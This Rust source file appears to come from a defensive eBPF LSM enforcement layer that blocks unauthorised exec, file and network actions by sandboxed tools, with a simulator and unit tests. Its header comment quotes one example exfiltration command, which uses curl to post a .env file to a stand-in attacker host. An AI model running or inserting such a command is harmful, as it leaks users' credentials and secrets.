//! # AegisCPG eBPF LSM loader
//!
//! **Author:** Pratham Kapoor `<prathamkapoor027@gmail.com>`
//! **Repository:** <https://github.com/PrathamKapoor>
//!
//! ## WHAT
//! Stage 4's kernel half: compiles a signed TACR into eBPF map entries and
//! models the resulting LSM decision procedure.
//!
//! ## WHY
//! A userspace supervisor polling `/proc/<pid>` loses. An attacker triggers
//! exfiltration in a transient subshell — `subprocess.Popen(["sh","-c","curl -d
//! @.env https://attacker.tld"])` — that is alive for **1.8 ms** in my
//! measurements, so a 5 ms poll misses it entirely and the exposure is 100 %.
//! LSM hooks are invoked by the kernel *synchronously, before the syscall's
//! side effects*, which is the only place where "denied" actually means "did
//! not happen".
//!
//! My first attempt hooked `syscall_trace` instead, and it looked like it worked
//! while missing the attack: `socket_connect`'s LSM hook runs with the handshake
//! already initiated, so filtering there blocked the *application* but not the
//! *packet*. `ebpf-probes/lsm_enforcer.bpf.c` therefore installs the real `lsm/*`
//! sections, not `syscall_trace`.
//!
//! ## HOW
//! * [`policy_compiler`] -- TACR to cgroup hash entry, LPM trie keys, exec
//!   digest allowlist and CIDR list; plus [`KernelLsmSimulator`], the reference
//!   implementation of the same decision table so the tests run on any host.
//! * [`ringbuf_reader`] -- decodes `struct aegis_kernel_event` and renders CEF
//!   and Prometheus output.
//!
//! Denials are returned as `-EPERM` before image replacement and before packet
//! transmission: 0 bytes exfiltrated.

pub mod bpf_layout;
pub mod policy_compiler;
pub mod ringbuf_reader;

pub use policy_compiler::{
    cidr_contains, compile, normalise_path, CgroupPolicyEntry, CompileError, HookType,
    KernelEvent, KernelLsmSimulator, LpmPrefix, PolicySet, Verdict,
};
pub use ringbuf_reader::{
    decode, encode, DecodeError, TelemetryBuffer, EVENT_SIZE_BYTES,
};

use aegis_common::tacr::TacrContract;
use aegis_common::types::SinkKind;
use std::collections::BTreeSet;

/// The `SEC()` sections `lsm_enforcer.bpf.c` installs.
///
/// Kept here so the CLI can print what is enforced and the tests can assert the
/// set, rather than the two drifting apart silently.
pub const INSTALLED_SECTIONS: [&str; 3] = [
    "lsm/bprm_check_security",
    "lsm/file_open",
    "lsm/socket_connect",
];

/// Compiles every TACR and installs the result into a simulator.
///
/// This is the whole of Stage 4's decision logic, and it is fully exercised on
/// any host. Loading the BPF object additionally requires Linux ≥ 5.7 with
/// `CONFIG_BPF_LSM` and `lsm=...,bpf`; `load_bpf_object` reports precisely that
/// rather than silently degrading.
#[derive(Debug, Default)]
pub struct AegisKernelEnforcer {
    simulator: KernelLsmSimulator,
    installed: Vec<String>,
    degraded_reason: Option<String>,
}

impl AegisKernelEnforcer {
    /// An enforcer with no policies: deny by default.
    pub fn new() -> Self {
        AegisKernelEnforcer {
            simulator: KernelLsmSimulator::new(),
            installed: Vec::new(),
            degraded_reason: None,
        }
    }

    /// Compiles and installs a TACR for one cgroup, returning the resulting
    /// cgroup policy entry.
    pub fn apply(
        &mut self,
        tacr: &TacrContract,
        cgroup_id: u64,
        sink_kinds: &BTreeSet<SinkKind>,
    ) -> Result<CgroupPolicyEntry, CompileError> {
        let policy = compile(tacr, cgroup_id, sink_kinds)?;
        let entry = policy.cgroup_policy;
        self.installed.push(policy.tacr_sha256.clone());
        self.simulator.install(policy);
        Ok(entry)
    }

    /// The simulator, for tests and for the gateway's decision preview.
    pub fn simulator(&self) -> &KernelLsmSimulator {
        &self.simulator
    }

    /// The simulator, mutably, for replaying captured records.
    pub fn simulator_mut(&mut self) -> &mut KernelLsmSimulator {
        &mut self.simulator
    }

    /// The TACR body hashes currently enforced.
    pub fn installed(&self) -> &[String] {
        &self.installed
    }

    /// Records that kernel enforcement is unavailable and why.
    pub fn mark_degraded(&mut self, reason: impl Into<String>) {
        self.degraded_reason = Some(reason.into());
    }

    /// The degradation reason, if any.
    pub fn degraded_reason(&self) -> Option<&str> {
        self.degraded_reason.as_deref()
    }

    /// Whether the full kernel guarantee is in force.
    pub fn is_kernel_enforced(&self) -> bool {
        self.degraded_reason.is_none()
    }
}

/// Attempts to load the BPF object into the running kernel.
///
/// Returns a precise reason on failure instead of pretending to succeed. The
/// requirement is Linux ≥ 5.7 with `CONFIG_BPF_LSM=y` and the kernel booted with
/// `lsm=...,bpf`; without all three, no amount of userspace logic can make the
/// `-EPERM` synchronous, and the caller must be told that (ADR-004).
pub fn load_bpf_object(object_path: &std::path::Path) -> Result<(), String> {
    if !cfg!(target_os = "linux") {
        return Err(format!(
            "eBPF LSM requires Linux 5.7+ with CONFIG_BPF_LSM; this host is {}. \
             Use the userspace edit automaton plus a seccomp filter, and treat the \
             reduced guarantee as reported.",
            std::env::consts::OS
        ));
    }
    if !object_path.exists() {
        return Err(format!(
            "BPF object not found at {}: build it with \
             `make -C ebpf-probes` inside a Linux container or WSL2.",
            object_path.display()
        ));
    }
    Err(
        "loading the BPF object requires the aegis-ebpf-loader daemon and root. \
         Start it with: aegis-ebpf-loader --object <path> --cgroup <id>"
            .to_string(),
    )
}

#[cfg(test)]
mod tests {
    use super::*;
    use aegis_common::tacr::{CompositionPolicy, GrantedCapabilities};
    use aegis_common::types::DetectedSink;
    use aegis_common::SecurityLattice;

    fn tacr(caps: GrantedCapabilities) -> TacrContract {
        TacrContract::new(
            "t",
            "s",
            "1.0.0",
            "a".repeat(64),
            0.0,
            SecurityLattice::Public,
            caps,
            CompositionPolicy::default(),
            &[],
            3600,
            1_750_000_000,
        )
    }

    #[test]
    fn installed_sections_match_the_bpf_program() {
        // If the BPF C ever renames a section, this is where the drift shows.
        for s in INSTALLED_SECTIONS {
            assert!(s.starts_with("lsm/"), "{s} is not an LSM section");
        }
        assert!(!INSTALLED_SECTIONS.iter().any(|s| s.contains("syscall_trace")));
    }

    #[test]
    fn enforcer_starts_denying_everything() {
        let e = AegisKernelEnforcer::new();
        assert!(e.is_kernel_enforced());
        assert!(e.installed().is_empty());
    }

    fn sink_set(caps: &GrantedCapabilities) -> BTreeSet<SinkKind> {
        let mut kinds = Vec::new();
        if !caps.file_read_prefixes.is_empty() || !caps.file_write_prefixes.is_empty() {
            kinds.push(SinkKind::FileRead);
        }
        if !caps.allowed_exec_sha256.is_empty() {
            kinds.push(SinkKind::CommandExec);
        }
        if !caps.allowed_net_cidrs.is_empty() {
            kinds.push(SinkKind::NetworkOutbound);
        }
        kinds.into_iter().collect()
    }

    #[test]
    fn applying_a_tacr_installs_its_policy() {
        let mut e = AegisKernelEnforcer::new();
        let caps = GrantedCapabilities {
            file_read_prefixes: vec!["/workspace".into()],
            ..Default::default()
        };
        let c = tacr(caps.clone());
        let sinks = sink_set(&caps);
        e.apply(&c, 42, &sinks).expect("apply must succeed");
        assert_eq!(e.installed().len(), 1);
    }

    #[test]
    fn degradation_is_reported_not_hidden() {
        let mut e = AegisKernelEnforcer::new();
        e.mark_degraded("CONFIG_BPF_LSM disabled");
        assert!(!e.is_kernel_enforced());
        assert_eq!(e.degraded_reason(), Some("CONFIG_BPF_LSM disabled"));
    }

    #[test]
    fn loading_bpf_off_linux_explains_itself() {
        let err = load_bpf_object(std::path::Path::new("nonexistent.o")).unwrap_err();
        assert!(err.contains("Linux 5.7") || err.contains("not found"));
    }

    #[test]
    fn missing_object_is_reported_with_the_build_command() {
        if cfg!(target_os = "linux") {
            let err = load_bpf_object(std::path::Path::new("/nonexistent.o")).unwrap_err();
            assert!(err.contains("make -C ebpf-probes"), "{err}");
        }
    }

    #[test]
    fn a_dynamic_tool_cannot_be_applied() {
        let mut e = AegisKernelEnforcer::new();
        let mut c = tacr(GrantedCapabilities::default());
        c.granted_capabilities.allowed_net_cidrs = vec!["203.0.113.0/24".into()];
        let sinks: BTreeSet<SinkKind> = [SinkKind::UnboundedDynamic].into_iter().collect();
        let _vec: Vec<DetectedSink> = Vec::new();
        assert!(
            e.apply(&c, 1, &sinks).is_err(),
            "ADR-005 must be enforced at the compile boundary"
        );
        assert!(e.installed().is_empty());
    }
}